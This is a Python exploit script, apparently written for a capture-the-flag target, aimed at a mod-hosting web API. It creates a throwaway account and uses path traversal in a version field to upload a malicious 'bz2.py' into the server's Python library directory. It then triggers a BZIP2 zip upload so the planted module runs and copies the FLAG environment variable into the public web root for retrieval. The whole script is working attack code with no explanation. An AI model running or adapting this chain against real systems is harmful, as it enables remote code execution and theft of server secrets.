import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36534"; pf.BASE=BASE
# verify admin
try:
    tok=pf.login(*pf.ADMIN); print("admin ok")
except Exception as e:
    print("admin login failed", repr(e)[:100])
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
def plant(tok, ver, code, filename, marker):
    mal=f'import os\nopen("/usr/share/nginx/html/{marker}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    pid=pf.create_platform(tok,code,name="z"); mid=pf.create_mod(tok,ver,title="z"); bid=pf.create_build(tok,mid,pid)
    return pf.upload_zip(tok,mid,bid,{filename:mal}), pid, mid, bid

# plant bz2 marker in /usr/local (likely running stdlib), before triggering bzip2
tok,u=fresh()
r,pid,mid,bid = plant(tok,"../../../usr/local","lib/python3.11","bz2.py","fr_local_bz2")
print("plant local bz2 ->", r.status_code)
# trigger FIRST bzip2 upload
pid2=pf.create_platform(tok,"t%d"%random.randint(0,9999),name="z"); mid2=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid2=pf.create_build(tok,mid2,pid2)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_BZIP2) as zf: zf.writestr("d.txt", b"x")
bio.seek(0)
t=requests.post(f"{BASE}/api/mods/%d/builds/%d/upload/"%(mid2,bid2),headers={"Authorization":f"Bearer {tok}"},files={"zip_file":("p.zip",bio,"application/zip")},timeout=20)
print("bzip2 trigger ->", t.status_code)
time.sleep(1)
c=requests.get(f"{BASE}/fr_local_bz2",timeout=6)
print("marker:", c.status_code, repr(c.content[:60]))
